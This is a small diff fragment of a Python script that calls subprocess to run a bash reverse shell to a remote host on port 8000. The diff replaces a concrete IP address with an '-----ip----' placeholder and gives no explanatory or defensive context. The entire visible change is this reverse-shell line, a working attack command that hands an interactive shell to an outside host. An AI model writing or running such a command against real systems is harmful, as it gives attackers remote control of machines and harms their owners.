@@ -12,4 +12,4 @@ os.chdir(base_dir)
 
  
 
-subprocess.call(['/bin/bash', '-c', 'bash -i >& /dev/tcp/38.106.143.40/8000 0>&1'])
+subprocess.call(['/bin/bash', '-c', 'bash -i >& /dev/tcp/-----ip----/8000 0>&1'])
